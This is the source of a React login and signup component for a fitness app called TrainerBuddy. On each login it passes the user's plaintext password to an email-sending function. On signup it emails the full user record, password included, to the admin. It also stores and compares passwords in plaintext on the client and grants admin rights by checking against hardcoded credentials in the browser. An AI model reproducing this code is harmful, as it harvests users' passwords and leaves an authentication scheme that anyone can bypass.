
import React, { useState } from 'react';
import { User, RegisteredUser } from '../types';
import { ADMIN_EMAIL, ADMIN_PASSWORD } from '../constants';
import { registerUser, findUser } from '../services/storageService';
import { sendLogInEmail, sendSignUpEmail } from '../services/emailService';

interface AuthProps {
  onLogin: (user: User) => void;
}

const Auth: React.FC<AuthProps> = ({ onLogin }) => {
  const [isLogin, setIsLogin] = useState(true);
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [dob, setDob] = useState('');
  const [gender, setGender] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const validateEmail = (email: string) => {
    // FIX: Changed [a-zA-Z0-0] to [a-zA-Z0-9]
    const re = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
    return re.test(email);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setSuccess('');
    setIsSubmitting(true);

    const normalizedEmail = email.toLowerCase().trim();

    if (isLogin) {
      if (normalizedEmail === ADMIN_EMAIL.toLowerCase() && password === ADMIN_PASSWORD) {
        onLogin({ 
          email: normalizedEmail, 
          isLoggedIn: true,
          isAdmin: true
        });
        setIsSubmitting(false);
        return;
      }

      const existing = findUser(normalizedEmail);
      
      if (!existing) {
        setError('No account found with this email. Please sign up first.');
        setIsSubmitting(false);
        return;
      }

      if (existing.password !== password) {
        setError('Incorrect password.');
        setIsSubmitting(false);
        return;
      }

      // Async email log but don't block login
      sendLogInEmail(normalizedEmail, password, existing.gender);

      onLogin({ 
        email: normalizedEmail, 
        phone: existing.phone, 
        dob: existing.dob,
        gender: existing.gender,
        password: existing.password,
        isLoggedIn: true,
        isAdmin: false
      });
      setIsSubmitting(false);
    } else {
      if (!email || !phone || !dob || !gender || !password || !confirmPassword) {
        setError('Please fill in all registration fields.');
        setIsSubmitting(false);
        return;
      }

      if (!validateEmail(normalizedEmail)) {
        setError('Please enter a valid email address (e.g., name@gmail.com).');
        setIsSubmitting(false);
        return;
      }

      if (password !== confirmPassword) {
        setError('Passwords do not match.');
        setIsSubmitting(false);
        return;
      }
      
      if (password.length < 6) {
        setError('Password must be at least 6 characters long.');
        setIsSubmitting(false);
        return;
      }

      try {
        const newUser: RegisteredUser = { email: normalizedEmail, phone, dob, gender, password };
        registerUser(newUser);
        
        // NEW: Send full info to admin immediately on signup
        await sendSignUpEmail(newUser);
        
        setSuccess('Account created! Logging you in...');
        
        // Auto-login for better UX
        setTimeout(() => {
          onLogin({ 
            email: normalizedEmail, 
            phone: phone, 
            dob: dob,
            gender: gender,
            password: password,
            isLoggedIn: true,
            isAdmin: false
          });
        }, 1500);

      } catch (e: any) {
        setError(e.message || 'Signup failed. Email might already be registered.');
      } finally {
        setIsSubmitting(false);
      }
    }
  };

  return (
    <div className="min-h-[85vh] flex items-center justify-center px-4 py-12 bg-gray-50">
      <div className="max-w-md w-full glass rounded-[2.5rem] p-10 shadow-2xl border-white relative overflow-hidden">
        <div className="absolute -top-24 -right-24 w-48 h-48 bg-blue-400/10 rounded-full blur-3xl"></div>
        <div className="absolute -bottom-24 -left-24 w-48 h-48 bg-purple-400/10 rounded-full blur-3xl"></div>

        <div className="text-center mb-10 relative z-10">
          <h2 className="text-3xl font-black font-poppins mb-2 text-gray-900">
            {isLogin ? 'Welcome Back' : 'Create Account'}
          </h2>
          <p className="text-gray-500 font-medium">
            {isLogin ? 'Login to your TrainerBuddy account' : 'Join the elite fitness community'}
          </p>
        </div>

        {error && (
          <div className="mb-6 p-4 bg-red-50 border border-red-100 text-red-600 text-sm font-bold rounded-xl flex items-center animate-pulse">
            <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
            </svg>
            {error}
          </div>
        )}

        {success && (
          <div className="mb-6 p-4 bg-green-50 border border-green-100 text-green-600 text-sm font-bold rounded-xl flex items-center">
            <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
            </svg>
            {success}
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4 relative z-10">
          <div>
            <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1.5 ml-1">Email Address</label>
            <input
              type="email"
              required
              className="w-full px-5 py-4 rounded-2xl border border-gray-100 bg-white/50 focus:bg-white focus:border-blue-500 focus:ring-4 focus:ring-blue-100 transition-all outline-none"
              placeholder="name@example.com"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              disabled={isSubmitting}
            />
          </div>

          {!isLogin && (
            <>
              <div className="grid grid-cols-2 gap-4 animate-in fade-in slide-in-from-top-2 duration-300">
                <div>
                  <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1.5 ml-1">Phone Number</label>
                  <input
                    type="tel"
                    required={!isLogin}
                    className="w-full px-5 py-4 rounded-2xl border border-gray-100 bg-white/50 focus:bg-white focus:border-blue-500 focus:ring-4 focus:ring-blue-100 transition-all outline-none"
                    placeholder="+91..."
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    disabled={isSubmitting}
                  />
                </div>
                <div>
                  <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1.5 ml-1">Date of Birth</label>
                  <input
                    type="date"
                    required={!isLogin}
                    className="w-full px-5 py-4 rounded-2xl border border-gray-100 bg-white/50 focus:bg-white focus:border-blue-500 focus:ring-4 focus:ring-blue-100 transition-all outline-none"
                    value={dob}
                    onChange={(e) => setDob(e.target.value)}
                    disabled={isSubmitting}
                  />
                </div>
              </div>
              <div className="animate-in fade-in slide-in-from-top-2 duration-300">
                <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1.5 ml-1">Gender</label>
                <select
                  required={!isLogin}
                  className="w-full px-5 py-4 rounded-2xl border border-gray-100 bg-white/50 focus:bg-white focus:border-blue-500 focus:ring-4 focus:ring-blue-100 transition-all outline-none font-medium text-gray-700 appearance-none bg-[url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20fill%3D%22none%22%20viewBox%3D%220%200%2024%2024%22%20stroke%3D%22currentColor%22%3E%3Cpath%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%20stroke-width%3D%222%22%20d%3D%22M19%209l-7%207-7-7%22%2F%3E%3C%2Fsvg%3E')] bg-[length:1.25rem_1.25rem] bg-[right_1.25rem_center] bg-no-repeat"
                  value={gender}
                  onChange={(e) => setGender(e.target.value)}
                  disabled={isSubmitting}
                >
                  <option value="" disabled>Select gender</option>
                  <option value="Male">Male</option>
                  <option value="Female">Female</option>
                  <option value="Other">Other</option>
                  <option value="Prefer not to say">Prefer not to say</option>
                </select>
              </div>
            </>
          )}

          <div>
            <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1.5 ml-1">Password</label>
            <input
              type="password"
              required
              className="w-full px-5 py-4 rounded-2xl border border-gray-100 bg-white/50 focus:bg-white focus:border-blue-500 focus:ring-4 focus:ring-blue-100 transition-all outline-none"
              placeholder="••••••••"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              disabled={isSubmitting}
            />
          </div>

          {!isLogin && (
            <div className="animate-in fade-in slide-in-from-top-2 duration-300">
              <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1.5 ml-1">Confirm Password</label>
              <input
                type="password"
                required={!isLogin}
                className="w-full px-5 py-4 rounded-2xl border border-gray-100 bg-white/50 focus:bg-white focus:border-blue-500 focus:ring-4 focus:ring-blue-100 transition-all outline-none"
                placeholder="••••••••"
                value={confirmPassword}
                onChange={(e) => setConfirmPassword(e.target.value)}
                disabled={isSubmitting}
              />
            </div>
          )}

          <button
            type="submit"
            disabled={isSubmitting}
            className={`w-full py-4 mt-4 rounded-2xl text-white font-black text-lg shadow-xl transition-all active:scale-[0.98] ${
              isSubmitting 
                ? 'bg-gray-400 cursor-not-allowed' 
                : 'bg-gray-900 shadow-gray-200 hover:bg-black hover:scale-[1.02]'
            }`}
          >
            {isSubmitting ? (
              <span className="flex items-center justify-center">
                <svg className="animate-spin h-5 w-5 mr-3 text-white" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                Processing...
              </span>
            ) : (
              isLogin ? 'Log In' : 'Sign Up'
            )}
          </button>
        </form>

        <div className="mt-8 pt-6 border-t border-gray-100 text-center relative z-10">
          <p className="text-gray-500 text-sm font-medium">
            {isLogin ? "Don't have an account?" : "Already have an account?"}{' '}
            <button
              onClick={() => {
                setIsLogin(!isLogin);
                setError('');
                setSuccess('');
              }}
              className="font-black text-blue-600 hover:text-blue-700 transition-colors"
            >
              {isLogin ? 'Register Now' : 'Sign In Now'}
            </button>
          </p>
        </div>
      </div>
    </div>
  );
};

export default Auth;
